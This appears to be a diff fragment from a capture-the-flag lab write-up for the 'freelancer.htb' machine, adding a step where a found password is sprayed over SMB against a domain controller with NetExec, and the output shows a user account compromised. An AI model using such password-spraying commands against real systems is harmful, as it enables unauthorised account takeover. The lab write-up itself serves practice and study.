@@ -364,6 +364,14 @@ t3mp0r@ryS@PWD
 Ill spray these passwords against the users i found in `C:\Users`
 
 ```python
+nxc smb dc.freelancer.htb -u users.txt -p 'IL0v3ErenY3ager' --continue-on-success
+
+SMB         10.129.66.164   445    DC               [+] freelancer.htb\mikasaAckerman:IL0v3ErenY3ager
+```
+
+This user is compromised
+
+```python
 
 ```
 
